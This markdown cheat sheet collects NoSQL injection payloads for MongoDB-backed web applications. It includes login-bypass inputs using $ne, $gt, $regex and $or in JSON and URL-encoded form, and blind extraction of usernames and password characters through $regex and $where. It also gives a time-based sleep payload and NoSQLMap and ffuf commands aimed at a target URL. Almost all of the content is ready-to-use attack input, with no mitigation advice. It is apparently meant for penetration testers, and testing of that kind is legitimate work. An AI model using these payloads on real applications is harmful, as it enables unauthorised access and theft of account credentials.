## 🚀 NoSQL Injection Cheat Sheet

---

### 🔍 **1. Basic Detection**

| Payload | Description |
|---------|-------------|
| `'` | Single quote (may cause error) |
| `"` | Double quote (may cause error) |
| `$ne` | Not equal operator |
| `$gt` | Greater than operator |
| `$or` | OR operator |
| `$where` | JavaScript execution |

---

### 🎯 **2. MongoDB Operators**

| Operator | Description | Example |
|----------|-------------|---------|
| `$ne` | Not equal | `{"username":{"$ne": "admin"}}` |
| `$gt` | Greater than | `{"age":{"$gt": 18}}` |
| `$lt` | Less than | `{"age":{"$lt": 30}}` |
| `$gte` | Greater or equal | `{"age":{"$gte": 18}}` |
| `$lte` | Less or equal | `{"age":{"$lte": 30}}` |
| `$in` | In array | `{"role":{"$in": ["admin", "user"]}}` |
| `$nin` | Not in array | `{"role":{"$nin": ["guest"]}}` |
| `$or` | OR condition | `{"$or": [{"user":"admin"}, {"pass":"123"}]}` |
| `$and` | AND condition | `{"$and": [{"user":"admin"}, {"pass":"123"}]}` |
| `$regex` | Regular expression | `{"username":{"$regex": "^admin"}}` |
| `$exists` | Field exists | `{"email":{"$exists": true}}` |
| `$type` | Data type | `{"age":{"$type": "number"}}` |
| `$where` | JavaScript execution | `{"$where": "this.password.length < 8"}` |

---

### 📝 **3. Authentication Bypass**

#### **Login Bypass**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}
```

#### **URL Encoded**
```
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

---

### 🔓 **4. Data Extraction**

#### **Extract Users**
```json
{"username": {"$regex": "^a"}}  // Users starting with 'a'
{"username": {"$regex": "^ad"}} // Users starting with 'ad'
{"username": {"$regex": "^adm"}} // Users starting with 'adm'
```

#### **Extract Password Length**
```json
{"$where": "this.password.length == 8"}
{"$where": "this.password.length > 5"}
```

#### **Extract Password Characters (Blind)**
```json
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password[0] == 'b'"}
{"$where": "this.password[0] == 'c'"}
```

---

### 🛠️ **5. NoSQL Injection in Parameters**

#### **URL Parameters**
```
GET /users?id=1&username[$ne]=null
GET /users?username[$regex]=^adm
```

#### **JSON Body**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

#### **Form Data**
```
username[$ne]=null&password[$ne]=null
username[$regex]=.*&password[$regex]=.*
```

---

### 🧪 **6. Tools for NoSQL Injection**

| Tool | Description | Command |
|------|-------------|---------|
| **NoSQLMap** | NoSQL injection tool | `nosqlmap -u "http://target.com/login" --data '{"username":"admin","password":"pass"}'` |
| **Burp Suite** | Manual testing | Use Repeater with JSON payloads |
| **ffuf** | Fuzzing | `ffuf -u http://target.com/api/users?username=FUZZ -w payloads.txt` |

---

### 📊 **7. Common Payloads**

#### **Authentication Bypass**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}
{"$or": [{"password": "admin"}, {"password": {"$ne": null}}]}
```

#### **Extract Data**
```json
{"username": {"$regex": "^admin"}}
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
```

#### **Boolean-Based Blind**
```json
{"$where": "1==1"}  // True
{"$where": "1==2"}  // False
{"$where": "this.username=='admin'"}
{"$where": "this.password.match(/^a/)"}
```

---

### ⚠️ **8. Testing Checklist**

- [ ] Test `$ne` (not equal) in login
- [ ] Test `$regex` for pattern matching
- [ ] Test `$where` for JavaScript injection
- [ ] Test `$or` for OR condition bypass
- [ ] Test `$gt` / `$lt` for data extraction
- [ ] Test URL encoded payloads
- [ ] Test JSON body payloads
- [ ] Test form data payloads

---

### 🧠 **9. Quick Reference**

| Goal | Payload |
|------|---------|
| **Bypass Login** | `{"username":{"$ne":null},"password":{"$ne":null}}` |
| **Extract Users** | `{"username":{"$regex":"^a"}}` |
| **Extract Password** | `{"$where":"this.password[0]=='a'"}` |
| **Get All Records** | `{"$or":[{"username":"admin"},{"username":{"$ne":null}}]}` |
| **Time-Based Blind** | `{"$where":"sleep(5000)"}` |

---

### 💡 **10. Pro Tips**

1. **Check for Error Messages** – They may reveal the database structure.
2. **Use Burp Suite** – Intercept and modify requests to test payloads.
3. **Test `$where` Last** – It's often the most dangerous but also most likely to be blocked.
4. **Combine Operators** – `$or` + `$regex` for advanced filtering.
5. **Use Blind Techniques** – If no errors, use boolean-based or time-based injection.
